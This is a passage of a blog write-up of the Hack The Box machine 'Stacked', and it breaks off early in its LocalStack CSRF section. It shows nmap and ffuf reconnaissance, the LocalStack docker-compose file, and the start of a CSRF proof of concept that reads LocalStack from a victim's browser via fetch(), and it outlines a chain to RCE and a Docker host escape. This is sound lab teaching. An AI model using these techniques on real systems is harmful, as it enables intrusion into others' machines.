<!doctype html><html lang="en"><head><title>Stacked | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Hack The Box. Linux. Insane machine. This machine contains a LocalStack environment that is vulnerable to CSRF and command injection. By discovering an XSS vulnerability in a subdomain, we can use CSRF to exploit the command injection vulnerability and get RCE inside a container. After escalating privileges inside the container by restarting a service and entering a malicious command, we can interact with Docker from the host machine and create a malicious container from scratch that mounts the host file system into the container to get arbitrary file read and write. Web exploitation techniques and deep Docker knowledge is needed in order to compromise this machine"><meta name="image" content="https://7rocky.github.io/images/HTB/Stacked/Stacked.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Insane machine. This machine contains a LocalStack environment that is vulnerable to CSRF and command injection. By discovering an XSS vulnerability in a subdomain, we can use CSRF to exploit the command injection vulnerability and get RCE inside a container. After escalating privileges inside the container by restarting a service and entering a malicious command, we can interact with Docker from the host machine and create a malicious container from scratch that mounts the host file system into the container to get arbitrary file read and write. Web exploitation techniques and deep Docker knowledge is needed in order to compromise this machine"><meta itemprop="keywords" content="cve,docker,volumes,command-injection,xss,rce,csrf,"><meta itemprop="name" content="Stacked"><meta property="article:published_time" content="2022-03-19T00:00:00+00:00"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Hack The Box. Linux. Insane machine. This machine contains a LocalStack environment that is vulnerable to CSRF and command injection. By discovering an XSS vulnerability in a subdomain, we can use CSRF to exploit the command injection vulnerability and get RCE inside a container. After escalating privileges inside the container by restarting a service and entering a malicious command, we can interact with Docker from the host machine and create a malicious container from scratch that mounts the host file system into the container to get arbitrary file read and write. Web exploitation techniques and deep Docker knowledge is needed in order to compromise this machine"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Stacked/Stacked.webp"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Stacked"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/en/htb/stacked/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="Hack The Box. Linux. Insane machine. This machine contains a LocalStack environment that is vulnerable to CSRF and command injection. By discovering an XSS vulnerability in a subdomain, we can use CSRF to exploit the command injection vulnerability and get RCE inside a container. After escalating privileges inside the container by restarting a service and entering a malicious command, we can interact with Docker from the host machine and create a malicious container from scratch that mounts the host file system into the container to get arbitrary file read and write. Web exploitation techniques and deep Docker knowledge is needed in order to compromise this machine"><meta name="twitter:description" content="Hack The Box. Linux. Insane machine. This machine contains a LocalStack environment that is vulnerable to CSRF and command injection. By discovering an XSS vulnerability in a subdomain, we can use CSRF to exploit the command injection vulnerability and get RCE inside a container. After escalating privileges inside the container by restarting a service and entering a malicious command, we can interact with Docker from the host machine and create a malicious container from scratch that mounts the host file system into the container to get arbitrary file read and write. Web exploitation techniques and deep Docker knowledge is needed in order to compromise this machine"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Stacked/Stacked.webp"><meta name="twitter:title" content="Stacked"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/htb/stacked/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/stacked/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/stacked/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/stacked/&amp;text=Stacked" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/stacked/&amp;title=Stacked" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Stacked</h1><time class="mt4 f6 dib tracked" datetime="2022-03-19T00:00:00+01:00">19 / 03 / 2022</time><br><p class="mb4 f6 dib tracked">17 minutes to read</p></header><div class="htb-image"><img alt="Stacked" src="/images/HTB/Stacked/Stacked.webp"><br><div class="htb-description bg-card">Hack The Box. Linux. Insane machine. This machine contains a LocalStack environment that is vulnerable to CSRF and command injection. By discovering an XSS vulnerability in a subdomain, we can use CSRF to exploit the command injection vulnerability and get RCE inside a container. After escalating privileges inside the container by restarting a service and entering a malicious command, we can interact with Docker from the host machine and create a malicious container from scratch that mounts the host file system into the container to get arbitrary file read and write. Web exploitation techniques and deep Docker knowledge is needed in order to compromise this machine</div></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/docker" title="Docker">Docker</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/volumes" title="Volume mounts">Volume mounts</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/command-injection" title="Command Injection">Command Injection</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/xss" title="Cross-Site Scripting">Cross-Site Scripting</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/csrf" title="Cross-Site Request Forgery">Cross-Site Request Forgery</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#compromising-localstack-mitm-proxy">Compromising LocalStack. MITM proxy</a></li><li><a href="#compromising-localstack-rce">Compromising LocalStack. RCE</a></li><li><a href="#finding-xss">Finding XSS</a></li><li><a href="#foothold-on-the-container">Foothold on the container</a></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation-in-the-container">Privilege escalation in the container</a></li><li><a href="#privilege-escalation-on-the-machine">Privilege escalation on the machine</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Insane</li><li><strong>IP Address</strong>: 10.10.11.112</li><li><strong>Release</strong>: 18 / 09 / 2021</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.112 -p 22,80,2376
Nmap scan report for 10.10.11.112
Host is up (0.051s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 12:8f:2b:60:bc:21:bd:db:cb:13:02:03:ef:59:36:a5 (RSA)
|   256 af:f3:1a:6a:e7:13:a9:c0:25:32:d0:2c:be:59:33:e4 (ECDSA)
|_  256 39:50:d5:79:cd:0e:f0:24:d3:2c:f4:23:ce:d2:a6:f2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: STACKED.HTB
2376/tcp open  ssl/docker?
| ssl-cert: Subject: commonName=0.0.0.0
| Subject Alternative Name: DNS:localhost, DNS:stacked, IP Address:0.0.0.0, IP Address:127.0.0.1, IP Address:172.17.0.1  
| Not valid before: 2021-07-17T15:37:02
|_Not valid after:  2022-07-17T15:37:02
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 19.38 seconds
</code></pre></div><p>This machine has ports 22 (SSH), 80 (HTTP) and 2376 (Docker) open.</p><h2 id="web-enumeration">Web enumeration</h2><p>There is a domain name called <code>stacked.htb</code> as shown in the <code>nmap</code> output, so we can put it in <code>/etc/hosts</code>. Moreover, <code>http://10.10.11.112</code> redirects to <code>http://stacked.htb</code>. If we go here, we will see a landing page like this:</p><p><img alt="Stacked landing page" src="/images/HTB/Stacked/Stacked-index.webp"></p><p>There is nothing to do here. We can apply fuzzing to enumerate some routes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://stacked.htb/FUZZ  
<span class="code-dark-blue">images                  [Status: 301, Size: 311, Words: 20, Lines: 10]</span>
<span class="code-dark-blue">css                     [Status: 301, Size: 308, Words: 20, Lines: 10]</span>
<span class="code-dark-blue">js                      [Status: 301, Size: 307, Words: 20, Lines: 10]</span>
<span class="code-dark-blue">fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10]</span>
<span class="code-dark-green">                        [Status: 200, Size: 5055, Words: 367, Lines: 159]</span>
<span class="code-dark-blue">sass                    [Status: 301, Size: 309, Words: 20, Lines: 10]</span>
<span class="code-dark-yellow">server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]</span>
</code></pre></div><p>But nothing interesting at all.</p><p>If we try to connect to port 2376 using <code>curl</code> we discover that we need client certificates:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k https://10.10.11.112:2376
curl: (56) OpenSSL SSL_read: error:14094412:SSL routines:ssl3_read_bytes:sslv3 alert bad certificate, errno 0  
</code></pre></div><p>Doing some research, we can see that port 2376 is used by Docker when it is configured to be used remotely by other machines. That&rsquo;s why it requires client certificates, as a method of authentication.</p><p>For the moment, let&rsquo;s continue by enumerating subdomains:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.112 -H <span class="code-dark-yellow">'Host: FUZZ.stacked.htb'</span> -fc 302  
<span class="code-dark-green">portfolio               [Status: 200</span>, Size: 30268, Words: 11467, Lines: 445]</span>
</code></pre></div><p>Once set this subdomain in <code>/etc/hosts</code>, we can go to <code>http://portfolio.stacked.htb</code> and see this website:</p><p><img alt="Stacked portfolio" src="/images/HTB/Stacked/Stacked-portfolio.webp"></p><p>Here we can download a file called <code>docker-compose.yml</code> which starts a LocalStack environment to mock AWS locally:</p><p><img alt="Stacked docker" src="/images/HTB/Stacked/Stacked-docker.webp"></p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">version</span><span class="mtk1">:</span> <span class="mtk4">"3.3"</span>

<span class="mtk5">services</span><span class="mtk1">:</span>
  <span class="mtk5">localstack</span><span class="mtk1">:</span>
    <span class="mtk5">container_name</span><span class="mtk1">:</span> <span class="mtk4">"${LOCALSTACK_DOCKER_NAME-localstack_main}"</span>
    <span class="mtk5">image</span><span class="mtk1">:</span> <span class="mtk4 detected-link">localstack/localstack-full</span><span class="mtk4">:0.12.6</span>
    <span class="mtk5">network_mode</span><span class="mtk1">:</span> <span class="mtk4">bridge</span>
    <span class="mtk5">ports</span><span class="mtk1">:</span>
      <span class="mtk1">-</span> <span class="mtk4">"127.0.0.1:443:443"</span>
      <span class="mtk1">-</span> <span class="mtk4">"127.0.0.1:4566:4566"</span>
      <span class="mtk1">-</span> <span class="mtk4">"127.0.0.1:4571:4571"</span>
      <span class="mtk1">-</span> <span class="mtk4">"127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}</span><span class="mtk4">"</span>
    <span class="mtk5">environment</span><span class="mtk1">:</span>
      <span class="mtk1">-</span> <span class="mtk4">SERVICES=serverless</span>
      <span class="mtk1">-</span> <span class="mtk4">DEBUG=1</span>
      <span class="mtk1">-</span> <span class="mtk4">DATA_DIR=/var/localstack/data</span>
      <span class="mtk1">-</span> <span class="mtk4">PORT_WEB_UI=${PORT_WEB_UI-</span> <span class="mtk4">}</span>
      <span class="mtk1">-</span> <span class="mtk4">LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR-</span> <span class="mtk4">}</span>
      <span class="mtk1">-</span> <span class="mtk4">LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY-</span> <span class="mtk4">}</span>
      <span class="mtk1">-</span> <span class="mtk4">KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABIL</span><span class="mtk4">ITY-</span> <span class="mtk4">}</span>  
      <span class="mtk1">-</span> <span class="mtk4">DOCKER_HOST=unix:///var/run/docker.sock</span>
      <span class="mtk1">-</span> <span class="mtk4">HOST_TMP_FOLDER="/tmp/localstack"</span>
    <span class="mtk5">volumes</span><span class="mtk1">:</span>
      <span class="mtk1">-</span> <span class="mtk4">"/tmp/localstack:/tmp/localstack"</span>
      <span class="mtk1">-</span> <span class="mtk4">"/var/run/docker.sock:/var/run/docker.sock"</span>
</code></pre></div><p>This file configures a container that exposes ports 443, 4566, 4571 and 8080 to interact with LocalStack. We can start it using <code>docker-compose up</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker-compose</span> up
[+] Running 1/0
 <span class="code-dark-blue">‚†ø Container localstack_main  Created                                                                                                                    0.0s</span>  
Attaching to localstack_main
<span class="code-dark-cyan">localstack_main  |</span> Waiting for all LocalStack services to be ready
...
<span class="code-dark-cyan">localstack_main  |</span> Ready.
<span class="code-dark-cyan">localstack_main  |</span> INFO:localstack.utils.analytics.profiler: Execution of "start_api_services" took 27272.037982940674ms
</code></pre></div><p>And we have all services ready:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> localhost:4566  
{"status": "running"}
</code></pre></div><p><img alt="Stacked localstack infra" src="/images/HTB/Stacked/Stacked-localstack-infra.webp"></p><p><img alt="Stacked localstack shell" src="/images/HTB/Stacked/Stacked-localstack-shell.webp"></p><h2 id="compromising-localstack-mitm-proxy">Compromising LocalStack. MITM proxy</h2><p>It is possible to install a MITM proxy and control requests and responses from LocalStack. It is show-cased in <a target="_blank" href="https://blog.sonarsource.com/hack-the-stack-with-localstack">SonarSource</a> and <a target="_blank" href="https://portswigger.net/daily-swig/localstack-zero-day-vulnerabilities-chained-to-achieve-remote-takeover-of-local-instances">PortSwigger</a>. Although the attack is explained, there is no exploit available, so we must build it by hand.</p><p>The first step is a Cross-Site Request Forgery (CSRF). The purpose is that the victim user accesses our malicious website and this website performs a request to <code>http://127.0.0.1:4566</code> to talk to LocalStack and configure some variables.</p><p>LocalStack allows Cross-Origin Resource Sharing (CORS) to any host, so the Same-Origin Policy will not block the HTTP responses and we will be able to read the responses from LocalStack.</p><p>Let&rsquo;s start by creating a simple <code>index.html</code> file that calls a <code>csrf.js</code> script:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">&lt;!</span><span class="mtk5">doctype</span> <span class="mtk8">html</span><span class="mtk1">&gt;</span>
<span class="mtk1">&lt;</span><span class="mtk5">html</span><span class="mtk1">&gt;</span>
  <span class="mtk1">&lt;</span><span class="mtk5">head</span><span class="mtk1">&gt;</span>
    <span class="mtk1">&lt;</span><span class="mtk5">title</span><span class="mtk1">&gt;LocalStack</span> <span class="mtk1">Exploit&lt;/</span><span class="mtk5">title</span><span class="mtk1">&gt;</span>  
    <span class="mtk1">&lt;</span><span class="mtk5">meta</span> <span class="mtk8">charset</span><span class="mtk1">=</span><span class="mtk4">"utf-8"</span><span class="mtk1">&gt;</span>
  <span class="mtk1">&lt;/</span><span class="mtk5">head</span><span class="mtk1">&gt;</span>
  <span class="mtk1">&lt;</span><span class="mtk5">body</span><span class="mtk1">&gt;</span>
    <span class="mtk1">&lt;</span><span class="mtk5">script</span> <span class="mtk8">src</span><span class="mtk1">=</span><span class="mtk4">"</span><span class="mtk4 detected-link">csrf.js</span><span class="mtk4">"</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">script</span><span class="mtk1">&gt;</span>
  <span class="mtk1">&lt;/</span><span class="mtk5">body</span><span class="mtk1">&gt;</span>
<span class="mtk1">&lt;/</span><span class="mtk5">html</span><span class="mtk1">&gt;</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">fetch</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://127.0.0.1:4566</span><span class="mtk4">'</span><span class="mtk1">)</span>  
  <span class="mtk1">.</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">res</span> <span class="mtk7 mtki">=&gt;</span> <span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">text</span><span class="mtk1">())</span>
  <span class="mtk1">.</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">)</span>
</code></pre></div><p>This is a simple way to know if we receive the response from LocalStack using CSRF. We start a Python web server on port 8000 and access the malicious website on host <code>172.16.33.1:8000</code> (simulating the victim user accessing the malicious website):</p><p><img alt="LocalStack CSRF" src="/images/HTB/Stacked/Stacked-localstack-csrf.webp"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">$ python3 -m http.server 8000
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:172.16.33.1 - - [] "GET / HTTP/1.1" 200 -
::ffff:172.16.33.1 - - [] "GET /csrf.js HTTP/1.1" 200 -
::ffff:172.16.33.1 - - [] "GET /csrf.js HTTP/1.1" 200 -
::ffff:172.16.33.1 - - [] code 404, message File not found
::ffff:172.16.33.1 - - [] "GET /favicon.ico HTTP/1.1" 404 -  
</code></pre></div><p>Now we can configure some variables: set <code>FORWARD_EDGE_INMEM</code> to <code>False</code> and <code>HOSTNAME</code> to our malicious IP address (<code>172.16.33.1</code>) in this way.</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">fetch</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://127.0.0.1:4566</span><span class="mtk4">'</span><span class="mtk1">)</span>
  <span class="mtk1">.</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">res</span> <span class="mtk7 mtki">=&gt;</span> <span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">text</span><span class="mtk1">())</span>
  <span class="mtk1">.</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">)</span>

